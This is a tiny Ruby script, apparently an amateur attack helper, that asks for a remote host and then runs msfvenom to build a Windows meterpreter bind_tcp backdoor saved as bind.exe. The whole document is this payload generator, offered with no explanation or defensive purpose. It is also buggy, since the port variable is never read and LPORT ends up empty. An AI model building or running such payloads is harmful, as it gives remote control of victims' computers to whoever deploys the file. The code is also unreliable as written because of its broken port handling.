print "add RHOST:"

rhost = gets

print rhost

print "add lport:"

print rport

system("msfvenom -p windows/meterpreter/bind_tcp RHOST=" + rhost + " " + "LPORT=" + " " + "-f exe > bind.exe")
